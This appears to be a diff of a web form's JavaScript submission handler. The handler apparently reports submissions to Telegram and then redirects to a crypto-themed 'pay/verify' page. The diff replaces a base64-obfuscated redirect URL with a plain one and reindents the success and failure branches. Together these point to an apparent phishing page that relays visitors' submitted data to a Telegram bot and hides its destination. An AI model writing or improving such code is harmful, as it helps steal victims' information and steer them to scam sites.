@@ -382,18 +382,18 @@ console.log("Telegram Response:", result);
 // ===== Success Handling =====
 if(result.ok){
 
-status.innerHTML = "✅ Submission successful. Redirecting...";
+    status.innerHTML = "✅ Submission successful. Redirecting...";
 
-// Small delay for UX
-setTimeout(()=>{
-window.location.href = _0xk("aHR0cHM6Ly9jcnlwdG9uaWNhcmVhLnd1YXplLmNvbS93YXB0L3BheS92ZXJpZnkvc3VjY2Vzcy8");
-},1000);
+    // Small delay for UX
+    setTimeout(()=>{
+        window.location.href = "https://cryptonicarea.site/wapt/pay/verify/Congrats/";
+    },1000);
 
-form.reset();
+    form.reset();
 
 }else{
 
-status.innerHTML = "❌ " + (result.description || "Submission failed");
+    status.innerHTML = "❌ " + (result.description || "Submission failed");
 
 }
 
